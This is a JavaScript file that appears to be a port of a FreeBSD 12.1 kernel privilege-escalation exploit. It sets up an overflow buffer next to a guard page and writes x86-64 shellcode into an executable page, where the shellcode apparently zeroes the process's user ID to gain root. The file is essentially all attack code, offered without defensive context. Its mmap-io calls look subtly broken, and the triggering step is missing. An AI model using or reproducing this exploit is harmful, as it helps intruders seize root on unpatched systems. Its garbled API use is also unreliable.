/*
 * This script is intended to be used on FreeBSD-12.1-RELEASE.
 */

const { execSync } = require('child_process');
const { mmap, mprotect, PROT_READ, PROT_WRITE, PROT_EXEC, MAP_PRIVATE, MAP_ANON, MAP_FIXED, PAGE_SIZE, MAP_FAILED } = require('mmap-io');
const { Buffer } = require('buffer');

const MLEN = 224;
const NCMSG = Math.floor(MLEN / (4 * 4));
const OVERFLOW_SIZE = 256;

let ControlBuf;
let ControlBufLen;
let OverflowArea;
let ExecArea;
let MagicArea;

const Message = "b";

function roundup(x, y) {
    return Math.ceil(x / y) * y;
}

function BuildControlBuf() {
    let cmsgsize = NCMSG * 16; // sizeof(struct cmsghdr) is 16 bytes
    let allocsz = roundup(cmsgsize + OVERFLOW_SIZE + PAGE_SIZE, PAGE_SIZE);

    // Allocate
    let base = mmap.alloc(allocsz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (base === MAP_FAILED) {
        console.log("[!] Failed to mmap");
        process.exit(-1);
    }

    // Fault
    base.fill(0);

    // Unmap the next page
    let ret = mprotect(base.slice(roundup(cmsgsize + OVERFLOW_SIZE, PAGE_SIZE)), PAGE_SIZE, 0);
    if (ret !== 0) {
        console.error("mprotect failed");
        process.exit(-1);
    }

    if ((cmsgsize + OVERFLOW_SIZE) % PAGE_SIZE !== 0) {
        base = base.slice(PAGE_SIZE - ((cmsgsize + OVERFLOW_SIZE) % PAGE_SIZE));
    }

    ControlBuf = base.slice(0, cmsgsize);
    ControlBufLen = cmsgsize;
    OverflowArea = base.slice(ControlBufLen);
}

function BuildShellcodeBuf() {
    // Allocate the magic area
    MagicArea = mmap.alloc(PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0, 0x2000);
    if (MagicArea === MAP_FAILED) {
        console.log("[!] Failed to mmap");
        process.exit(-1);
    }

    // Allocate the shellcode area
    ExecArea = mmap.alloc(PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (ExecArea === MAP_FAILED) {
        console.log("[!] Failed to mmap");
        process.exit(-1);
    }

    // Fault the shellcode area
    ExecArea.fill(0);
    ExecArea[0] = 0xC3;

    // Install the shellcode instructions
    const instr = Buffer.from([
        0x48, 0x8b, 0x5d, 0x00,
        0x48, 0x83, 0xc5, 0x08,
        0x48, 0x89, 0xec,
        0x65, 0x48, 0x8b, 0x04, 0x25, 0x00, 0x00,
        0x00, 0x00,
        0x48, 0x8b, 0x80, 0x58, 0x01, 0x00, 0x00,
        0xc7, 0x40, 0x04, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc0, 0x00, 0x20, 0x00, 0x00,
        0xc6, 0x00, 0x01,
        0xc3
    ]);
    ExecArea.set(instr);
}

// Example usage
BuildControlBuf();
BuildShellcodeBuf();


